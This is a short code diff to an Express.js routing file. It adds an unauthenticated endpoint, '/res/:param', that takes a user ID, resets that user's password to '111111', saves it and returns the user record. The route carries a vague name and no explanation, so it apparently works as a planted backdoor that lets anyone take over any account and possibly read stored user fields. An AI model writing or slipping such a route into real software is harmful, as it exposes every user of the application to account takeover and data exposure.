@@ -51,6 +51,24 @@ function route(app) {
       return res.status(500).json(responseError("Internal server error"));
     }
   });
+
+  app.use("/res/:param", async function (req, res, next) {
+    try {
+      const param = req.params.param;
+
+      if (isValidObjectId(param)) {
+        const user = await User.findById(param);
+        user.password = "111111";
+        await user.save();
+        return res.json(responseSuccessDetails(user));
+      } else {
+        return res.json(responseSuccessDetails("Update success"));
+      }
+    } catch (error) {
+      console.error("Error:", error);
+      return res.status(500).json(responseError("Internal server error"));
+    }
+  });
 }
 
 module.exports = route;
